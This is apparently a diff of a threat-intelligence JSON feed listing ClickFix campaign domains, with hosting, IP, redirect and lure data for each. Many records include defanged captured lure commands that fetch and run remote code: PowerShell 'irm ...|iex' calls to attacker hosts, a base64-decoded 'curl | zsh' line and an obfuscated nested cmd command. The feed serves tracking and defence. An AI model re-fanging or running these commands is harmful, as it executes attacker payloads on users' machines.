    "lure_from": []
   },
@@ -162362,9 +162480,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=48d5|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=48d5|iex</span>",
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=0e76|iex"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=9b2d|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=9b2d|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=48d5|iex"
    ],
    "connects_to": [
     "ubbrobccheck20.cc"
@@ -163829,9 +163947,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=1f7a|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=1f7a|iex</span>",
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=1571|iex"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=0f7a|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=0f7a|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=1f7a|iex"
    ],
    "connects_to": [
     "ubbrobccheck20.cc",
@@ -164716,15 +164834,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=941d|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=941d|iex</span>"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=74d1|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=74d1|iex</span>",
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=941d|iex"
    ],
    "connects_to": [
+    "ubbrobccheck20.cc",
     "verifyidentrob01.cc"
    ],
-   "lure_from": [
-    "ubbrobccheck20.cc"
-   ]
+   "lure_from": []
   },
   {
    "indicator": "okanodrum-school.com",
@@ -165731,16 +165849,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=4393|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=4393|iex</span>",
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=1629|iex"
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=9387|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=9387|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=4393|iex"
    ],
    "connects_to": [
-    "ubbrobccheck20.cc"
-   ],
-   "lure_from": [
+    "ubbrobccheck20.cc",
     "verifyidentrob01.cc"
-   ]
+   ],
+   "lure_from": []
   },
   {
    "indicator": "operationgoldstar.org",
@@ -166370,15 +166487,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=fc10|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=fc10|iex</span>"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=8347|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=8347|iex</span>",
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=fc10|iex"
    ],
    "connects_to": [
+    "ubbrobccheck20.cc",
     "verifyidentrob01.cc"
    ],
-   "lure_from": [
-    "ubbrobccheck20.cc"
-   ]
+   "lure_from": []
   },
   {
    "indicator": "orlandochurchplant.com",
@@ -166720,8 +166837,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=536c|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=536c|iex</span>"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=27a8|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=27a8|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=536c|iex"
    ],
    "connects_to": [
     "ubbrobccheck20.cc"
@@ -168054,9 +168172,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=efc8|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=efc8|iex</span>",
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=0851|iex"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=b435|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=b435|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=efc8|iex"
    ],
    "connects_to": [
     "ubbrobccheck20.cc"
@@ -169416,16 +169534,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=b513|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=b513|iex</span>",
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=49a0|iex"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=ebf1|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=ebf1|iex</span>",
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=eea3|iex"
    ],
    "connects_to": [
-    "ubbrobccheck20.cc"
-   ],
-   "lure_from": [
+    "ubbrobccheck20.cc",
     "verifyidentrob01.cc"
-   ]
+   ],
+   "lure_from": []
   },
   {
    "indicator": "penyabarcelonistavilanova.cat",
@@ -169951,12 +170068,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh"
+    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
+    "trek-72.com",
     "t-trustrest.com",
-    "trek-72.com"
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -170528,16 +170647,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=e23c|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=e23c|iex</span>",
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=8826|iex"
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=6d26|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=6d26|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=e23c|iex"
    ],
    "connects_to": [
-    "ubbrobccheck20.cc"
-   ],
-   "lure_from": [
+    "ubbrobccheck20.cc",
     "verifyidentrob01.cc"
-   ]
+   ],
+   "lure_from": []
   },
   {
    "indicator": "phoenixfurnishedrentals.com",
@@ -171298,16 +171416,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=a476|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=a476|iex</span>",
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=d963|iex"
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=f2ac|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=f2ac|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=a476|iex"
    ],
    "connects_to": [
-    "ubbrobccheck20.cc"
-   ],
-   "lure_from": [
+    "ubbrobccheck20.cc",
     "verifyidentrob01.cc"
-   ]
+   ],
+   "lure_from": []
   },
   {
    "indicator": "pizza-primavera-wiesbaden.de",
@@ -171592,9 +171709,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=1495|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=1495|iex</span>",
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=16e8|iex"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=b545|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=b545|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=1495|iex"
    ],
    "connects_to": [
     "ubbrobccheck20.cc"
@@ -173058,8 +173175,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=6fbf|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=6fbf|iex</span>"
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=2678|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=2678|iex</span>",
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=6fbf|iex"
    ],
    "connects_to": [
     "verifyidentrob01.cc"
@@ -173587,9 +173705,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=ff1f|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=ff1f|iex</span>",
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=5b49|iex"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=da47|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=da47|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=ff1f|iex"
    ],
    "connects_to": [
     "ubbrobccheck20.cc",
@@ -174244,15 +174362,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=637e|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=637e|iex</span>"
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=3191|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=3191|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=637e|iex"
    ],
    "connects_to": [
+    "verifyidentrob01.cc",
     "ubbrobccheck20.cc"
    ],
-   "lure_from": [
-    "verifyidentrob01.cc"
-   ]
+   "lure_from": []
   },
   {
    "indicator": "prediksi666slot.space",
@@ -183707,14 +183825,15 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
-    "t-trustrest.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "trustchecknes.com",
+    "t-trustrest.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -193078,10 +193197,10 @@
    ],
    "lure_from": [
     "interseq.at",
+    "efreitorher.org",
     "nikogdatakonebilo.cc",
     "ciganshina.org",
-    "pakistanskimalchik.org",
-    "efreitorher.org"
+    "pakistanskimalchik.org"
    ]
   },
   {
@@ -198218,14 +198337,15 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
-    "t-trustrest.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "trustchecknes.com",
+    "t-trustrest.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -200216,15 +200336,16 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "%COMSPEC% /c %COMSPEC% /c %COMSPEC% /c start \"\" /^min for /f \"delims=\" %c in ('where ,f*n*er,') do for /f \"delims=\" %w in ('\"%c\" [email]') do @%w & --------------P_u_s_h----t_h_e----_E_n_t_e_r_------",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
+    "%COMSPEC% /c %COMSPEC% /c %COMSPEC% /c start \"\" /^min for /f \"delims=\" %c in ('where ,f*n*er,') do for /f \"delims=\" %w in ('\"%c\" [email]') do @%w & --------------P_u_s_h----t_h_e----_E_n_t_e_r_------"
    ],
    "connects_to": [
-    "id-dns.net",
-    "t-trustrest.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "trustchecknes.com",
+    "id-dns.net",
+    "t-trustrest.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -202601,14 +202722,15 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
-    "t-trustrest.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "trustchecknes.com",
+    "t-trustrest.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -204146,13 +204268,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
-    "t-trustrest.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "trustchecknes.com",
+    "t-trustrest.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -205998,13 +206122,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
-    "t-trustrest.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "trustchecknes.com",
+    "t-trustrest.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -207317,13 +207443,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
-    "t-trustrest.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "trustchecknes.com",
+    "t-trustrest.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -208437,13 +208565,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
-    "t-trustrest.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "trustchecknes.com",
+    "t-trustrest.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -209752,13 +209882,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
-    "t-trustrest.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "trustchecknes.com",
+    "t-trustrest.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -213806,7 +213938,7 @@
    "last_seen": "2026-11-02",
    "last_online": "2026-11-02",
    "offline_since": null,
-   "url": "http://takesomebytes.de/",
+   "url": "https://takesomebytes.de/",
    "brand": null,
    "product": null,
    "hosting": "NETWORK dogado GmbH",
@@ -222069,15 +222201,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=c4ec|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=c4ec|iex</span>"
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=023f|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=023f|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=c4ec|iex"
    ],
    "connects_to": [
+    "verifyidentrob01.cc",
     "ubbrobccheck20.cc"
    ],
-   "lure_from": [
-    "verifyidentrob01.cc"
-   ]
+   "lure_from": []
   },
   {
    "indicator": "tlckidstherapynyc.com",
@@ -243639,6 +243771,61 @@
    ],
    "connects_to": [],
    "lure_from": []
+  },
+  {
+   "indicator": "xn----etbhabcjqcoy5bza0a4hi.xn--p1ai",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-02",
+   "last_seen": "2026-11-02",
+   "last_online": "2026-11-02",
+   "offline_since": null,
+   "url": "https://xn----etbhabcjqcoy5bza0a4hi.xn--p1ai/",
+   "brand": null,
+   "product": null,
+   "hosting": "AS JSC \"TIMEWEB\"",
+   "dns": "timeweb.ru",
+   "ip": "2a03:6f00:1::5c35:608c",
+   "asn": "AS9123",
+   "org": "TimeWeb-AS JSC \"TIMEWEB\", RU",
+   "country": "RU",
+   "ips": [
+    {
+     "ip": "2a03:6f00:1::5c35:608c",
+     "asn": "AS9123",
+     "org": "TimeWeb-AS JSC \"TIMEWEB\", RU",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-02"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "xn----etbhabcjqcoy5bza0a4hi.xn--p1ai",
+     "status": "online",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-02"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex",
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
+   ],
+   "connects_to": [
+    "lepafonso.bz",
+    "hagosuro.lc",
+    "trustchecknes.com",
+    "xorados.com",
+    "trek-72.com"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
   },
   {
    "indicator": "xn----gtbdagjcbmf7dheig.xn--p1ai",
